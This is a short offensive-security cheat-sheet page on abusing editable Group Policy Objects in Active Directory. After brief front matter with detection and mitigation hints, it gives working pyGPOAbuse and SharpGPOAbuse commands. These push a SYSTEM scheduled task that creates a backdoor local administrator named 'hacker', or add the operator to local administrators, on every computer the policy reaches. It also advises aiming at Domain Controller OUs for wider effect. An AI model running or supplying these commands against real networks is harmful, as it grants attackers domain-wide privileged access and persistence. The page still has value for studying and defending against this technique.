---
title: GPO abuse
category: AD / GPO
order: 20
tags: [gpo, sharpgpoabuse, pygpoabuse, writable-gpo, scheduled-task]
summary: >
  A GPO you can edit is code execution on every user/computer it's linked to.
  Add an immediate scheduled task or startup script and wait for the refresh (or
  force it) — a common privesc and mass-deploy primitive.
prerequisites:
  - Write access to a GPO (WriteDacl/GenericWrite/owner over the gPLink or GPO object) — check BloodHound
  - The GPO linked to a target OU with useful principals
tools: [pyGPOAbuse, SharpGPOAbuse, PowerView, netexec]
detection:
  - 5136 changes to a GPO; new scheduled tasks / startup scripts in SYSVOL; gpupdate storms
mitigation:
  - Restrict GPO edit rights; monitor GPO/SYSVOL changes; least-privilege OU delegation
refs:
  - { label: "pyGPOAbuse", url: "https://github.com/Hackndo/pyGPOAbuse" }
  - { label: "SpecterOps — aBloodHound GPO", url: "https://posts.specterops.io/" }
---

## Find writable GPOs

```sh
# BloodHound: "GPOs you can write" / GenericWrite on a GPO
netexec ldap $dc_ip -u $user -p $password -M gpp_autologin   # adjacent check
```

## Abuse — add an immediate scheduled task

```sh
# pyGPOAbuse (Linux): add a task that runs as SYSTEM on affected computers
pygpoabuse.py $domain/$user:$password -gpo-id <GPO_GUID> \
  -command 'net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add'
```

```powershell
# SharpGPOAbuse (Windows)
SharpGPOAbuse.exe --AddComputerTask --TaskName "upd" --Author $domain\$user \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators $user /add" --GPOName "Vulnerable GPO"
```

Then wait for the ~90-min policy refresh, or force it on a box you already touch:
`gpupdate /force`.

> Scope matters: a GPO linked to an OU full of servers (or the Domain Controllers
> OU) is far more valuable than one on a single workstation — follow the link.
